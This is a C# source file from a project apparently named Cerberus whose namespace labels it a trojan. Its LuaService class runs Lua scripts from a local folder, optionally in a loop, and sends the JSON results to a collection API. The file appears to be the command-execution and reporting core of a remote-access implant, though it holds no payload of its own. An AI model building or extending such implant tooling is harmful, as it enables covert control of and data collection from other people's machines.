using Cerberus.Domain.Models.Script;
using Cerberus.Domain.Models.Static;
using Cerberus.Presentation.Trojan.Exceptions;
using Cerberus.Presentation.Trojan.Interface;
using Newtonsoft.Json;
using NLua;

namespace Cerberus.Presentation.Trojan.Core
{
    public class LuaService : ILuaService
    {
         
        public string Name { get; set;}
        public bool LoopScript { get; set;}

        private readonly Lua _lua;
        private Task<object[]>? _luaTask;
        private CancellationTokenSource? _luaToken;
        public string? Value { get; set;}


        private string? Result {  get; set; }

        public LuaService(Lua lua, string Name, bool LoopScript)
        {
            this.Name = Name;
            this._lua = lua;
            this._luaTask = null;
            this._luaToken = null;
            this.LoopScript = LoopScript;

            Init();
        }

        private void Init()
        {

            this._lua.DoFile("scripts\\"+this.Name+".lua");
            LuaFunction luaFunction = this._lua.GetFunction(this.Name);

            if (luaFunction == null)
                throw new LuaNotFoundException();

            this._luaToken = new CancellationTokenSource();
            this._luaTask = new Task<object[]>(() => luaFunction.Call(),_luaToken.Token);

        }

        public void Start()
        {

            if (this._luaTask != null)
            {
                Console.WriteLine(this.Name + " started...");
                this._luaTask.Start();
                object[] result = this._luaTask.Result;
                string serialized = JsonConvert.SerializeObject(result);
                Send(serialized);
                if (this.LoopScript)
                {
                    Init();
                    Start();
                }
            }

        }

        public async Task StartAsync()
        {
            Console.WriteLine(this.Name + " async started...");
            if (this._luaTask != null)
            {
                this._luaTask.Start();
                object[] result = await this._luaTask;
                string serialized = JsonConvert.SerializeObject(result);
                await SendAsync(serialized);
                //Send(JsonConvert.SerializeObject(result));
                if (this.LoopScript)
                {
                    Init();
                    await StartAsync();
                }

            }

        }

        public void Send(string serialized) 
        {

            Console.WriteLine(this.Name + " - Sending data...");

            LuaResult _result = new LuaResult();
            _result.IP = "testIP";
            _result.Json = serialized;
            _result.Script = this.Name;
            _result.Time = DateTime.Now;
            _result.Type = LuaResultType.STRING;

            _ = Program._luaResultApiService.CreateLuaResult(_result);


        }

        public async Task SendAsync(string serialized)
        {

            Console.WriteLine(this.Name + " - Sending data...");

            LuaResult _result = new LuaResult();
            _result.IP = "testIP";
            _result.Json = serialized;
            _result.Script = this.Name;
            _result.Time = DateTime.Now;
            _result.Type = LuaResultType.STRING;

            _ = await Program._luaResultApiService.CreateLuaResult(_result);


        }

        public void Stop()
        {
            if(this._luaToken != null)
                this._luaToken.Cancel();
        }

    }

}
